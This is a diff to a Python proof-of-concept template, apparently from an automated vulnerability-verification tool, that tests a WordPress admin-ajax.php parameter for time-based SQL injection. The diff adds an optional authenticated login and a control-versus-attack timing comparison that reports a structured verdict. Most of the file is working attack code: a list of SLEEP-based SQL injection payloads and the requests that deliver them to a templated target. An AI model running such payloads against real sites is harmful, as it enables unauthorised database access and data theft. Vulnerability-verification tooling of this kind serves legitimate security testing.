@@ -1,8 +1,21 @@
-import requests, time
+import statistics
+import time
+import requests
+from wp_login import wp_login
+from poc_result import emit_result
 
 TARGET = "{{ target_url }}"
 ACTION = "{{ ajax_action }}"
 PARAM  = "{{ injectable_param }}"
+ATTACKER_ROLE = "{{ attacker_role }}"
+USERNAME = "{{ test_username }}"
+PASSWORD = "{{ test_password }}"
+
+session = requests.Session()
+if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
+    login = wp_login(session, TARGET, USERNAME, PASSWORD)
+    if not login.success:
+        raise RuntimeError(f"attacker login failed: {login.reason}")
 
 PAYLOADS = [
     "' AND SLEEP(5)-- -",
@@ -13,23 +26,28 @@ PAYLOADS = [
     "1; SELECT SLEEP(5)-- -",
 ]
 
-def test(payload: str) -> tuple[bool, float]:
+def test(payload: str) -> float:
     start = time.time()
-    resp = requests.post(
+    resp = session.post(
         f"{TARGET}/wp-admin/admin-ajax.php",
         data={"action": ACTION, PARAM: payload},
         timeout=30,
     )
     elapsed = time.time() - start
-    return elapsed > 4.0, elapsed
+    return elapsed
 
 if __name__ == "__main__":
-    print(f"[*] Testing SQLi: action={ACTION} param={PARAM}")
-    for p in PAYLOADS:
-        ok, t = test(p)
-        if ok:
-            print(f"[+] SUCCESS payload={p!r} delay={t:.1f}s")
-            break
-        print(f"[-] No delay ({t:.1f}s): {p!r}")
-    else:
-        print("[!] FAILURE: no SQLi confirmed")
+    control = [test("1") for _ in range(3)]
+    payload = PAYLOADS[0]
+    attack = [test(payload) for _ in range(3)]
+    observed = statistics.median(attack) - statistics.median(control) >= 3.0
+    emit_result(
+        verdict="vulnerable" if observed else "not_vulnerable",
+        oracle="timing",
+        attacker_role=ATTACKER_ROLE,
+        request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
+        attack={"observed": observed, "samples_seconds": attack, "payload": payload},
+        control={"observed": False if observed else True, "samples_seconds": control, "payload": "1"},
+        confidentiality="high" if observed else "none",
+        impact="Attacker-controlled SQL changes query execution timing, demonstrating SQL injection." if observed else "No repeatable SQL timing differential was observed.",
+    )
